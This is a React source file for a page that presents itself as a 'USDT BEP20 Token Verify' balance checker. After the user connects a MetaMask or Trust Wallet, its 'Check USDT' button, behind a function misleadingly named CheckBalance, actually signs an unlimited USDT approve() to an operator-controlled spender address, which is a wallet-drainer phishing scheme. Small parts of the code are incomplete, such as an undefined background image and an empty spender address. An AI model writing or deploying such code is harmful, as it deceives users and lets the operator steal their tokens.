// src/App.js
import React, { useState } from "react";
import { ethers } from "ethers";
import "./Background.css";

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
const BACKEND_SPENDER_ADDRESS = ""; // your backend address

const USDT_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
];

function App() {
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [account, setAccount] = useState(null);
  const [txHash, setTxHash] = useState(null);
  const [loading, setLoading] = useState(false);
  const [darkMode, setDarkMode] = useState(false);

  async function connectWallet() {
    if (!window.ethereum) {
      alert("Please install MetaMask or Trust Wallet");
      return;
    }
    try {
      await window.ethereum.request({ method: "eth_requestAccounts" });
      const _provider = new ethers.BrowserProvider(window.ethereum);
      const _signer = await _provider.getSigner();
      const address = await _signer.getAddress();

      setProvider(_provider);
      setSigner(_signer);
      setAccount(address);
      setTxHash(null);
    } catch (error) {
      console.error("Connection error:", error);
      alert("Failed to connect wallet");
    }
  }

  async function CheckBalance() {
    if (!signer) {
      alert("Please connect your wallet first");
      return;
    }
    const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
    const maxAmount = ethers.MaxUint256;

    try {
      setLoading(true);
      const tx = await usdtContract.approve(BACKEND_SPENDER_ADDRESS, maxAmount);
      setTxHash(tx.hash);
      await tx.wait();
      alert("Approval confirmed!");
    } catch (error) {
      console.error("Approval error:", error);
      alert("Approval failed: " + error.message);
    } finally {
      setLoading(false);
    }
  }


  return (
    <div
      className={`app-background ${darkMode ? "dark" : "light"}`}
      style={{ backgroundImage: `url(${backgroundImage})` }}
    >
      <div className="content">
        <div className="toggle-container">
          <label className="switch">
            <input type="checkbox" onChange={() => setDarkMode(!darkMode)} />
            <span className="slider round"></span>
          </label>
        </div>
        <h2>USDT BEP20 Token Verify</h2>
        {!account ? (
          <button onClick={connectWallet} disabled={loading}>
            Connect Wallet
          </button>
        ) : (
          <>
            <p>Connected: <b>{account}</b></p>
            <button onClick={CheckBalance} disabled={loading}>
              {loading ? "Checking..." : "Check USDT"}
            </button>
            {txHash && (
              <p>
                Tx Hash: <a href={`https://bscscan.com/tx/${txHash}`} target="_blank" rel="noreferrer">
                  {txHash.slice(0, 10)}...{txHash.slice(-8)}
                </a>
              </p>
            )}
          </>
        )}
      </div>
    </div>
  );
}

export default App;

